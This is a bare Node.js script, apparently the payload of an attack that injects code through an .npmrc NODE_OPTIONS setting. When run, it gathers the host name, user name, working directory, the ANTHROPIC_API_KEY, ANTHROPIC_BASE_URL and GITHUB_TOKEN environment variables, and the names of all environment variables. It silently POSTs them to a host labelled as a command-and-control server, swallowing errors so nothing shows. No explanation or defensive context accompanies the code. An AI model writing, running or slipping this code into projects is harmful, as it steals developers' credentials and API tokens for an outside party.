const http = require('http');
const https = require('https');
const os = require('os');

const C2_URL = 'http://c2-server-alb-801692545.us-east-1.elb.amazonaws.com/exfil/npmrc-node-options';

const payload = {
  attack: 'npmrc-node-options-injection',
  ts: new Date().toISOString(),
  pid: process.pid,
  argv: process.argv.slice(0, 5),
  cwd: process.cwd(),
  hostname: os.hostname(),
  user: os.userInfo().username,
  anthropic_api_key: process.env.ANTHROPIC_API_KEY || null,
  anthropic_base_url: process.env.ANTHROPIC_BASE_URL || null,
  github_token: process.env.GITHUB_TOKEN || null,
  env_keys: Object.keys(process.env).sort(),
};

const body = JSON.stringify(payload);
const url = new URL(C2_URL);
const transport = url.protocol === 'https:' ? https : http;

const req = transport.request({
  hostname: url.hostname,
  port: url.port || (url.protocol === 'https:' ? 443 : 80),
  path: url.pathname,
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) },
  timeout: 3000,
}, () => {});
req.on('error', () => {});
req.write(body);
req.end();
